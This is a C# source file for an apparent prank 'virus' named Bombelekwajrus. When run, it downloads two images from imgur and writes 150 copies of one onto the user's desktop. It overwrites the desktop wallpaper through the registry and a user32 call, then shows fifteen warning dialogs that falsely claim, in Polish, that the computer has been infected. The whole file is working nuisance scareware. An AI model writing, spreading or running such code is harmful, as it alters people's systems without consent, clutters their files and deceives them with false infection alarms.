using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace Bombelekwajrus
{
    static class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
           UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static public void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        static void Main()
        {


            string sciezka_zapisu = Path.GetTempPath() + "\\bombelek.png";
            using (var client = new WebClient())
                {
                    client.DownloadFile("https://i.imgur.com/EaOfJ1L.png", sciezka_zapisu);
                }

            string sciezka_zapisu2 = Path.GetTempPath() + "\\bombelek1.png";

            using (var client = new WebClient())
                {
                    client.DownloadFile("https://i.imgur.com/qV6KbBQ.png", sciezka_zapisu2);
                }

            string pulpit = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

           for(int x = 0; x < 150; x++) File.Copy(sciezka_zapisu2, pulpit + "\\bombelek" + x.ToString() + ".png");

                

            // path
            string imgWallpaper = Path.GetTempPath() + "\\bombelek.png";

            // verify    
            if (File.Exists(imgWallpaper))
            {
                SetWallpaper(imgWallpaper);
            }
            for (int x = 0; x < 15; x++) MessageBox.Show("Twój komputer został zawirusowany!", "Błąd", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    
    }
}
